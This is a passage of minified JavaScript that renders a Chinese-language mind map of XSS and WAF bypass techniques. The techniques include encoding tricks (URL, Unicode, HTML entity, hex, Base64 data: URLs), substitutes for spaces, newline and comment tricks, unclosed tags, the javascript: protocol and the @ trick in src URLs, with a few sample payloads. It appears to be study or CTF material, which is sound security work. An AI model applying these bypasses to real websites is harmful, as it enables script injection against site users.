010attribute\u503C\u3011\uFF1A\u5C5E\u6027\u503C")))])),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e.\u5E38\u7528\u8BED\u53E5)),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e.\u9AD8\u53EF\u9760)),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e.\u8F83\u5E38\u89C4)),{},{children:[]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u5F88\u5947\u8469)),{},{children:[]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u4E2D\u53EF\u9760)),{},{children:[]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u4F4E\u53EF\u9760)),{},{children:[]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.bypass\u7ED5\u8FC7)),{},{children:[Object(t.a)({},Object(s.a)(e.\u5927\u5C0F\u5199\u654F\u611F,[j.a.createElement("div",null,"\u867D\u7136\u6BD4\u8F83\u3010\u57FA\u7840\u3011\uFF0C\u5F80\u5F80\u5E38\u89C1\u800C\u6709\u7528\u3002")])),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7,[j.a.createElement("div",null,"\u8F93\u5165\u65B9\u5F0F\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 \u53EF\u4EE5\u901A\u8FC7\u3010IDE\u3011\u8F93\u5165\u540E\uFF0C\u518D\u590D\u5236\u7C98\u8D34\u8FC7\u53BB ",Object(s.c)("\u5982 \u3010\\f\u3011 \u2014 \u3010\f\u3011"))))])),{},{children:[Object(t.a)({},Object(s.a)(e[":"],["\u3010\u5192\u53F7\u3011",": %3A"])),Object(t.a)({},Object(s.a)(e[";"],["\u3010\u5206\u53F7\u3011","%3B"])),Object(t.a)({},Object(s.a)(e[","],["\u3010\u9017\u53F7\u3011","%2C"])),Object(t.a)({},Object(s.a)(e["()"],["\u3010\u5C0F\u62EC\u53F7\u3011","( %28",") %29"])),Object(t.a)({},Object(s.a)(e["'"],["\u3010\u5355\u5F15\u53F7\u3011","' %27"])),Object(t.a)({},Object(s.a)(e['"'],["\u3010\u53CC\u5F15\u53F7\u3011",'" %22'])),Object(t.a)({},Object(s.a)(e["`"],["\u3010\u53CD\u5F15\u53F7\u3011","%60"])),Object(t.a)({},Object(s.a)(e["."],["\u3010\u70B9\u53F7\u3011","%2e"])),Object(t.a)({},Object(s.a)(e["<>"],["\u3010\u5C16\u62EC\u53F7\u3011 \u3010\u5C0F\u4E8E\u53F7\u3001\u5927\u4E8E\u53F7\u3011","< %3C","> %3E","\u3010\u6807\u7B7E\u95ED\u5408\u3011","\u6709\u65F6\u5019\uFF0C\u53EAbypass\u5DE6\u8FB9\u7684\uFF1B\u6709\u65F6\u5019\uFF0C\u53EAbypass\u53F3\u8FB9\u7684\u3002"])),Object(t.a)({},Object(s.a)(e["="],["\u3010\u7B49\u4E8E\u53F7\u3011","%3D"])),Object(t.a)(Object(t.a)({},Object(s.a)(e["/"],["\u3010\u659C\u6760\u3011","%2F",j.a.createElement("div",null,v["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u7279\u6B8A\u7528\u9014\uFF1A\u5728",e.\u7EAFHTML\u5185,"\u5185\uFF0C\u4EE3\u66FF\u3010\u7A7A\u683C\u3011\uFF0C\u5206\u9694",e.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027,"\u3010\u540D\u5B57\u3011 ",Object(s.c)("\u5C5E\u4E8E\u5229\u7528\uFF0C\u6765\u7ED5\u8FC7\u5176\u5B83"))))])),{},{children:[Object(t.a)({},Object(s.a)(e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]))]}),Object(s.d)(e.\u5B57\u7B26\u4E32\u53D8\u91CF,e.\u5757\u7EA7JS\u4EE3\u7801\u5185)]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u7F16\u7801\u65B9\u5F0F)),{},{children:[Object(t.a)({},Object(s.a)(e.\u5BBD\u5B57\u8282,[j.a.createElement("div",null,"\u652F\u6301\u7684\u5B57\u7B26\u96C6",j.a.createElement("ol",null,s.e.map(function(r){return j.a.createElement("li",null,r)})))])),Object(t.a)({},Object(s.a)(e["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"],[j.a.createElement("div",null,v["\u539F\u7406\u573A\u666F\uFF1A"]),j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 \u3010\u6B63\u5219\u53CC\u53CD\u659C\u6760\u3011+\u3010\u5D4C\u5165\u5B57\u7B26\u4E32\u3011+\u3010\u4F20\u9012\u7ED9\u6D4F\u89C8\u5668\uFF0Chtml\u89E3\u6790\u3011"),j.a.createElement("li",null,"\u2461 \u3010\u6B63\u5219\u53CC\u53CD\u659C\u6760\u3011+\u3010\u5D4C\u5165\u5B57\u7B26\u4E32\u3011+\u3010\u4F20\u9012\u7ED9\u6D4F\u89C8\u5668\uFF0Chtml\u89E3\u6790\u3011+\u3010",v["\u3010script block js\u3011"],"\u91CC\u53C8\u6709\u5B57\u7B26\u4E32\uFF0C\u8F6C\u4E49\u3011"))])),Object(t.a)(Object(t.a)({},Object(s.a)(e.UrlEncode\u8DEF\u5F84\u7F16\u7801,[j.a.createElement("div",null,v["\u539F\u7406\u573A\u666F\uFF1A"]),j.a.createElement("ol",null,j.a.createElement("li",null,"\u5927\u90E8\u5206\u60C5\u51B5\u4E0B\uFF0C\u90FD\u662F\u3010\u88AB\u8F6C\u5316\u8FD8\u539F\u3011\u540E\uFF0C\u624D\u53D1\u6325\u4F5C\u7528 ",Object(s.c)("\u672C\u8EAB\u65E0\u4F5C\u7528\uFF0C\u88AB\u8F6C\u5316\u540E\u624D\u8D77\u4F5C\u7528")),j.a.createElement("li",null,"\u5728\u4EE5\u4E0B\u573A\u5408\uFF0C\u7279\u522B\u6709\u7528",j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 ",v["Url\u5730\u5740\u680F\uFF0C\u624B\u52A8\u8F93\u5165"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u5355\u884C\u6587\u672C"),j.a.createElement("li",null,"\u591A\u884C\u6587\u672C ",Object(s.c)("%0A\u7684\u6362\u884C\u7B26\uFF0C\u5F80\u5F80\u662F\u4E00\u4E2A\u975E\u5E38\u6709\u7528\u7684\u6280\u5DE7")))),j.a.createElement("li",null,"\u2461 ",v["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"],Object(s.c)("\uFF08\u800C\u4E14\u8981\u975E\u5E38\u7D27\u51D1\uFF01\u4E0D\u80FD\u7559\u5E38\u89C4\u7A7A\u683C\uFF09"),Object(s.c)("\u5176\u5B9E\uFF0C\u672C\u8D28\u4E0A\u5C31\u662F".concat(v["\u3010html inline js\u3011"],"\u7684\u6267\u884C")),j.a.createElement("ol",null,j.a.createElement("li",null,'\u3010location\u8DF3\u8F6C\u3011location="javascript:print%281%29" ',Object(s.c)("\u6B64\u5904\u4E0D\u80FD\u95F4\u9694\u7A7A\u683C"))))))),j.a.createElement("div",null,v["\u65E0\u6548\u573A\u5408\uFF1A"]," ",Object(s.c)("\u6CE8\u610F\uFF0C\u662F\u65E0\u6548\uFF01"),j.a.createElement("ol",null,j.a.createElement("li",null,v["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"]," ",Object(s.c)("\u8FD9\u70B9\uFF0C\u662F\u8D85\u4E4E\u4E00\u822C\u7684\u60F3\u8C61\u7684\u3002\u786E\u5B9E\u4E0D\u53EF\u4EE5"),j.a.createElement("ol",null,j.a.createElement("li",null,j.a.createElement("div",null,'location="https%3A%2F%2Fwww.segmentfault.com%40127.0.0.1%3A20443%2Ftest.js"'),j.a.createElement("div",null,Object(s.c)("\u5FC5\u987B\u5148\u7528\u3010decodeURIComponent\u3011\uFF0C\u624D\u80FD\u6709\u6548"))))),j.a.createElement("li",null,v["\u3010src\u3011\u5C5E\u6027"]," ",Object(s.c)("\u8FD9\u4E2A\u4E0D\u884C\u3002\u6BD4\u5176\u5B83\u7F16\u7801\uFF0C\u8981\u5F31\u4E00\u70B9"))))])),{},{children:[]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["Unicode \u4E07\u56FD\u7801"],[j.a.createElement("div",null,"\u5206\u4E3A4\u79CD\u5F62\u5F0F\uFF1A",j.a.createElement("ol",{style:{fontSize:"2rem",lineHeight:"2rem"}},j.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011U+000\u2460\u2460",j.a.createElement("ol",null,j.a.createElement("li",null,Object(s.c)("\u6682\u65F6\u672A\u77E5",{fontSize:"1rem"})))),j.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011&#x\u2460\u2460;",j.a.createElement("ol",null,j.a.createElement("li",null,Object(s.c)("\u3010\u5F00\u5934\u7B26\u3011\u4E4B\u540E\uFF0C\u53EF\u4EE5\u63A5\u3010\u65E0\u9650\u591A\u4E2A0\u3011",{fontSize:"1rem"})))),j.a.createElement("li",null,"\u3010\u5341\u8FDB\u5236\u3011&#\u2460\u2460;",j.a.createElement("ol",null,j.a.createElement("li",null,Object(s.c)("\u3010\u5F00\u5934\u7B26\u3011\u4E4B\u540E\uFF0C\u53EF\u4EE5\u63A5\u3010\u65E0\u9650\u591A\u4E2A0\u3011",{fontSize:"1rem"})))),j.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011\\u00\u2460\u2460",j.a.createElement("ol",null,j.a.createElement("li",null,Object(s.c)("\u4E0D\u80FD\u52A0\u30100\u3011",{fontSize:"1rem"})),j.a.createElement("li",null,Object(s.c)("\u6570\u5B57\u90E8\u5206\uFF0C\u4E00\u5B9A\u662F\u30104\u4F4D\u3011\uFF1B\u524D\u97622\u4F4D\uFF0C\u7ECF\u5E38\u662F\u301000\u3011",{fontSize:"1rem"})),j.a.createElement("li",null,Object(s.c)("\u5B57\u6BCDu\uFF0C\u5BF9\u3010\u5927\u5C0F\u5199\u3011\u654F\u611F\uFF1B\u4E00\u5B9A\u8981\u662F\u3010\u5C0F\u5199\u3011",{fontSize:"1rem"})))),j.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011","\\u{\u2460\u2460}",j.a.createElement("ol",null,j.a.createElement("li",null,Object(s.c)("\u3010\u5F00\u5934\u7B26|\u82B1\u62EC\u53F7\u3011\u4E4B\u540E\uFF0C\u53EF\u4EE5\u63A5\u3010\u65E0\u9650\u591A\u4E2A0\u3011",{fontSize:"1rem"}))))),v["\u539F\u7406\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u3010js\u89E3\u6790\u5668\u3011\u5728\u5DE5\u4F5C\u65F6\u4F1A\u5BF9\u3010unicode\u3011\u5148\u8FDB\u884C\u3010\u89E3\u7801\u3011\u3002")),v["\u539F\u7406\u573A\u666F\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 ",v["\u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS"]," "),j.a.createElement("li",null,"\u2461 ",v["\u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS"]," "),j.a.createElement("li",null,"\u2462 ",v["\u3010src\u3011\u5C5E\u6027"]," ",Object(s.c)("\u6B64\u5904\uFF0C\u3010\u5B57\u7B26\u4E32\u3011\u5FC5\u987B\u7531\u3010\u4EFB\u4F55\u4E00\u5BF9\u5F15\u53F7\u3011\u5305\u88F9")),j.a.createElement("li",null,"\u2463 \u3010",e.\u5757\u7EA7JS\u4EE3\u7801\u5185,"\u3011\uFF1A ",Object(s.c)("\u4E00\u5C11\u90E8\u5206(\u4E0B\u97622\u4E2A)\uFF0C\u652F\u6301"),j.a.createElement("ol",null,j.a.createElement("li",null,"\\u{\u2460\u2460}"," ",Object(s.c)("\u5F88\u795E\u5947\uFF0C\u5F88\u6709\u7528")),j.a.createElement("li",null,"\\u00\u2460\u2460 ",Object(s.c)("\u5F88\u795E\u5947\uFF0C\u5F88\u6709\u7528")))),j.a.createElement("li",null,"\u2464 \u3010",v["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"],"\u3011\uFF1A ",Object(s.c)("\u5927\u90E8\u5206(\u4E0B\u97623\u4E2A)\uFF0C\u652F\u6301"),j.a.createElement("ol",null,j.a.createElement("li",null,"&#x\u2460\u2460; \u6709\u6548"),j.a.createElement("li",null,"&#\u2460\u2460; \u6709\u6548"),j.a.createElement("li",null,"\\u{\u2460\u2460}"," \u6709\u6548"),j.a.createElement("li",null,"\\u00\u2460\u2460 \u65E0\u6548\uFF1B\u800C\u4E14\u540E\u9762\u6CA1\u6709\u3010\u5206\u9694\u7B26\u3011 ",Object(s.c)("\u65E0\u6548\u7684\u4E00\u4E2A"))))),v["\u65E0\u6548\u573A\u5408\uFF1A"],Object(s.c)("\u6CE8\u610F\uFF0C\u662F\u65E0\u6548\uFF01"),j.a.createElement("ol",null,j.a.createElement("li",null,v["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"])),v["\u4F18\u70B9\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 \u5305\u542B\u4E86\u3010\u82F1\u6587\u5B57\u6BCD\u3011")))])),{},{children:[]}),Object(t.a)({},Object(s.a)(e.HTML\u5B9E\u4F53\u5316\u7F16\u7801,[j.a.createElement("div",null,"\u53EA\u67091\u79CD\u5F62\u5F0F\uFF1A",j.a.createElement("ol",{style:{fontSize:"2rem",lineHeight:"2rem"}},j.a.createElement("li",null,"\u3010\u5B57\u6BCD\u3011","&","\u5355\u8BCD\u7F29\u5199;")),v["\u539F\u7406\u573A\u666F\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 \u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS"),j.a.createElement("li",null,"\u2461 \u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS"),j.a.createElement("li",null,"\u2462 ",v["\u3010src\u3011\u5C5E\u6027"]," ",Object(s.c)("\u6B64\u5904\uFF0C\u3010\u5B57\u7B26\u4E32\u3011\u5FC5\u987B\u7531\u3010\u4EFB\u4F55\u4E00\u5BF9\u5F15\u53F7\u3011\u5305\u88F9")),j.a.createElement("li",null,"\u2463 \u65E0"),j.a.createElement("li",null,"\u2464 ",v["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u6240\u6709\u7684")))),v["\u65E0\u6548\u573A\u5408\uFF1A"],Object(s.c)("\u6CE8\u610F\uFF0C\u662F\u65E0\u6548\uFF01"),j.a.createElement("ol",null,j.a.createElement("li",null,v["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"]),j.a.createElement("li",null,e.\u5757\u7EA7JS\u4EE3\u7801\u5185)),v["\u7F3A\u70B9\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 \u5E76\u4E0D\u80FD\u5305\u542B \u5E38\u89C4\u7684\u3010\u82F1\u6587\u5B57\u6BCD\u3011\uFF1B")),v["\u4F18\u70B9\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u62E5\u6709\u3010\u5F88\u5947\u602A\u3011\u7684\u8986\u76D6\u9762\uFF1B\u8FD9\u610F\u5473\u7740 WAF \u66F4\u96BE\u8003\u8651\u5468\u5168\u3002",Object(s.c)("\u6BD4\u5982\uFF0C\u67D0\u4E9B\u51B7\u95E8\u8BED\u8A00\u7684\u5B57\u6BCD\uFF0C\u5B83\u53C8\u504F\u504F\u5305\u542B"))))])),Object(t.a)({},Object(s.a)(e["ASCII \u7F8E\u56FD\u7801"],[j.a.createElement("div",null,"ASCII \u7F8E\u56FD\u4FE1\u606F\u4EA4\u6362\u6807\u51C6\u4EE3\u7801"),j.a.createElement("div",null,Object(s.c)("\u53EF\u4EE5\u7528\u4E8E\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\uFF0C\u8FD9\u662F\u8BA9\u6211\u5F88\u60CA\u5947\u7684\uFF01")),j.a.createElement("div",null,"\u5206\u4E3A1\u79CD\u5F62\u5F0F\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"\u3010\u4E24\u4F4D\u3011 \\x\u2460\u2460 \u3010\u4E09\u4F4D\u3011 \\x\u2460\u2460\u2460 ",Object(s.c)("\u5C0F\u96C6\uFF0C\u4ECE0\u5230127\uFF1B\u5927\u96C6\uFF0C\u4ECE0\u5230255")))),j.a.createElement("div",null,v["\u539F\u7406\u573A\u666F\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u4E00\u822C\u7528\u4E8E JS\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\u3002 ",Object(s.c)("\u89E3\u51B3\u4E86\u4E4B\u524D\u5934\u75BC\u7684\u4E00\u4E2A\u95EE\u9898\uFF1B\u586B\u8865\u4E86\u7A7A\u767D\u3002"))))])),Object(t.a)(Object(t.a)({},Object(s.a)(e["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],[j.a.createElement("div",null,"\u5206\u4E3A2\u79CD\u5F62\u5F0F\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 data:,\u3010JS\u8BED\u53E5\u6267\u884C\u3011"),j.a.createElement("li",null,"\u2461 data:\u3010\u534F\u8BAE/\u5B50\u540D\u3011;\u3010base64,\u7F16\u7801\u5B57\u7B26\u3011")))])),{},{children:[]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.HTML5)),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e["\u65B0 \u6807\u7B7E"])),{},{children:[]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"])),{},{children:[]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u6807\u7B7E\u540D)),{},{children:[Object(t.a)({},Object(s.a)(e["\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199"],["\u6807\u7B7E\u540D\uFF0C\u5B8C\u5168\u4E0D\u533A\u5206\u5927\u5C0F\u5199\uFF1B\u4F60\u53EF\u4EE5\u4EFB\u610F\u7684\u3010\u5927\u5C0F\u5199\u6DF7\u5199\u3011"]))]}),Object(t.a)({},Object(s.a)(e["\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD"],["\u603B\u7ED3\uFF0C\u5404\u79CD\u5947\u8469\u3010\u5B57\u6BCD\u3011\uFF1B \u4EE5\u53CA\uFF0C\u6D4F\u89C8\u5668\u7684\u5947\u8469\u3010\u8F6C\u6362\u89C4\u5219\u3011",j.a.createElement("ol",null,j.a.createElement("li",null,Object(s.c)("\u53E4\u82F1\u8BED\u4E2D\uFF0C\u3010\u017F\u3011\u662F\u3010s\u5B57\u6BCD\u3011\u7684\u5199\u6CD5"),"\u3002",j.a.createElement("ol",null,j.a.createElement("li",null,"\u5C0F\u5199\u65F6\uFF0C\u3010\u017F\u3011 \u65E0\u6CD5\u8BC6\u522B"),j.a.createElement("li",null,"\u8F6C\u6362\u6210 \u5927\u5199 \u65F6\uFF0C\u3010\u017F\u3011\u53D8\u6210\u4E86\u3010S\u5B57\u6BCD\u3011\u3002",Object(s.c)("\u6B64\u65F6\u53EF\u4EE5\u8BC6\u522B")))))])),Object(t.a)(Object(t.a)({},Object(s.a)(e["\u6362\u884C\u7B26\u3001\u56DE\u8F66\u7B26\u3001\u7A7A\u683C\u7B26\u3001\u5236\u8868\u7B26\u3001\u6362\u9875\u7B26\u3001NUL\u7B26\u53F7"])),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e.\u6362\u884C\u7B26,[j.a.createElement("div",null,"LF\u6362\u884C (Line Feed)",j.a.createElement("ol",null,j.a.createElement("li",null,"%0A"),j.a.createElement("li",null,"\\n"))),j.a.createElement("div",null,"\u4EFB\u610F\uFF08HTML\u6807\u7B7E\u7684\uFF09JS\u8BED\u6CD5\u4E2D\uFF1A",Object(s.c)("innerHTML\u503C\u3001attribute\u503C\u3001script\u5185\u5BB9\u503C\uFF0C\u7686\u53EF"),j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 javascript\u534F\u8BAE"),j.a.createElement("li",null,"\u2461 \u5192\u53F7"),j.a.createElement("li",null,"\u7B49\u7B49")),"HTML\u6807\u7B7E\u5185\uFF0C\u5C5E\u6027\u5916\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"\u3010\u6807\u7B7E\u540D\u3011\u4E2D\uFF0C\u53EA\u80FD\u5728 \u540D\u5B57\u6BCD \u548C \u53F3\u95ED\u5408 \u4E4B\u95F4\uFF0C\u4F7F\u7528\u3010\u6362\u884C\u3011\u624D\u4F1A\u6709\u6548")),"\u539F\u7406\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"\u89E3\u6790\u5F15\u64CE\uFF1A\u53EF\u4EE5\u4F7F\u7528\u6362\u884C\u7B26\u6765\u7ED5\u8FC7\uFF0C\u56E0\u4E3AJavascript\u901A\u5E38\u4EE5\u5206\u53F7\u7ED3\u5C3E\u3002",j.a.createElement("ol",null,j.a.createElement("li",null,"\u5982\u679C\u89E3\u6790\u5F15\u64CE\u80FD\u786E\u5B9A\u4E00\u4E2A\u8BED\u53E5\u65F6\u5B8C\u6574\u7684\uFF0C\u4E14\u884C\u5C3E\u6709\u6362\u884C\u7B26\uFF0C\u5219\u5206\u53F7\u53EF\u7701\u7565"),j.a.createElement("li",null,"\u800C\u5982\u679C\u4E0D\u662F\u5B8C\u6574\u7684\u8BED\u53E5\uFF0Cjavascript\u5219\u4F1A\u7EE7\u7EED\u5904\u7406\uFF0C\u76F4\u5230\u8BED\u53E5\u5B8C\u6574\u7ED3\u675F\u6216\u5206\u53F7")))))])),{},{children:[]}),Object(t.a)({},Object(s.a)(e.\u56DE\u8F66\u7B26,[j.a.createElement("div",null,"\u56DE\u8F66 (Carriage Return)",j.a.createElement("ol",null,j.a.createElement("li",null,"%0D"),j.a.createElement("li",null,"\\r")))])),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u7A7A\u683C\u7B26,[j.a.createElement("div",null,"\u7A7A\u683C",j.a.createElement("ol",null,j.a.createElement("li",null,"%20"),j.a.createElement("li",null)))])),{},{children:[Object(s.d)(e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"],e.\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7),Object(t.a)({},Object(s.a)(e["\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],[j.a.createElement("div",null,v["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u5728",v["\u3010script block js\u3011"],"\u4E2D\uFF0C\u7A7A\u683C\u88AB\u5C4F\u853D\u65F6\uFF0C\u7528\u3010/**/\u3011\uFF0C\u53EF\u4EE5\u4EE3\u66FF"),j.a.createElement("li",null,"\u5728",e["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"],"\u4E2D\uFF0Cfunction\u58F0\u660E\uFF0C\u7A7A\u683C\u88AB\u5C4F\u853D\u65F6\uFF0C\u7528\u3010/**/\u3011\uFF0C\u53EF\u4EE5\u4EE3\u66FF")))])),Object(t.a)({},Object(s.a)(e["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"]))]}),Object(t.a)({},Object(s.a)(e.\u5236\u8868\u7B26,[j.a.createElement("div",null,"\u5236\u8868\u7B26",j.a.createElement("ol",null,j.a.createElement("li",null,"\u6C34\u5E73",j.a.createElement("ol",null,j.a.createElement("li",null,"%09"),j.a.createElement("li",null,"\\t"))),j.a.createElement("li",null,"\u5782\u76F4",j.a.createElement("ol",null,j.a.createElement("li",null,"%0B"),j.a.createElement("li",null,"\\v"))))),j.a.createElement("div",null)])),Object(t.a)({},Object(s.a)(e.\u6362\u9875\u7B26,[j.a.createElement("div",null,"\u6362\u9875\u7B26\uFF08Form Feed\uFF09",j.a.createElement("ol",null,j.a.createElement("li",null,"%0C"),j.a.createElement("li",null,"0x0c"),j.a.createElement("li",null,"\\f")))])),Object(t.a)({},Object(s.a)(e.NUL\u7B26\u53F7,[j.a.createElement("div",null,"NUL\u7B26\u53F7 (null character)",j.a.createElement("ol",null,j.a.createElement("li",null,"%00"),j.a.createElement("li",null,"\\0")))]))]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u6CE8\u91CA,["\u4E0D\u5BF9\u79F0\u6CE8\u91CA\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"<!-- \u5185\u5BB9\uFF0C\u540E\u9762\u4E0D\u5BF9\u79F0 -->")),"\u5BF9\u79F0\u6CE8\u91CA\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"<!-- \u5185\u5BB9\uFF0C\u540E\u9762\u5BF9\u79F0 --!>")),"JS\u5185\uFF0C\u591A\u6837\u5316\u7684\u3010\u5355\u884C\u6CE8\u91CA\u3011",j.a.createElement("ol",null,j.a.createElement("li",null,"// \u5185\u5BB9"),j.a.createElement("li",null,"/* \u5185\u5BB9 */"),j.a.createElement("li",null,"<!--"," \u5185\u5BB9"),j.a.createElement("li",null,"-->"," \u5185\u5BB9"))])),{},{children:[]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E"],[j.a.createElement("div",null,"\u79D2\u6740\uFF1A\u5BF9\u3010\u5B8C\u6574\u95ED\u5408\u6807\u7B7E\u3011\u7684\u68C0\u67E5"),j.a.createElement("div",null,"\u539F\u7406\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"html\u7684\u5BB9\u9519\u6027\u5F88\u9AD8\uFF0C\u5BF9\u4E8E\u6807\u7B7E\u4E0D\u95ED\u5408\u4E5F\u53EF\u4EE5\u63A5\u53D7")))])),{},{children:[]})]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027,[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,v["\u3010html inline js\u3011"],"\uFF1Ahtml\u884C\u5185\u4EE3\u7801"))),j.a.createElement(j.a.Fragment,null,"WAF\uFF0C\u5BF9",v["\u3010html inline js\u3011"],"\u505A\u8F6C\u4E49\uFF0C\u5C31\u662F\u65E0\u7528\u529F ",Object(s.c)("\u4F46\u662F\uFF0C\u5BF9<script>\u7684innerHTML\uFF0C\u505A\u8F6C\u4E49\uFF0C\u5C31\u662F\u6709\u6548\u7684"),j.a.createElement("ol",null,j.a.createElement("li",null,"\u6D4F\u89C8\u5668\u4F1A\u5148\u89E3\u6790\u3010html\u3011\uFF1B\u7136\u540E\u518D\u89E3\u6790\u3010js\u3011 ",Object(s.c)("\u89E3\u6790\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u4F1A\u89E3\u7801"))))])),{},{children:[Object(t.a)({},Object(s.a)(e.\u5E38\u7528\u8BED\u53E5)),Object(t.a)(Object(t.a)({},Object(s.a)(e.bypass\u7ED5\u8FC7)),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e.src\u5C5E\u6027)),{},{children:[Object(t.a)({},Object(s.a)(e["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"],[j.a.createElement("ol",null,j.a.createElement("li",null,"\u6709\u65F6\u5019\uFF0C\u5F00\u5934\u9650\u5B9A\u4E86\uFF0C\u53EF\u4EE5\u7528\u3010@\u3011\u6A21\u62DF\u3010\u767B\u5F55\u534F\u8BAE\u3011\u3002\u4EE5\u6539\u53D8\u3010\u4E3B\u57DF\u540D\u3011\u3002",Object(s.c)("\u4EC5 FireFox 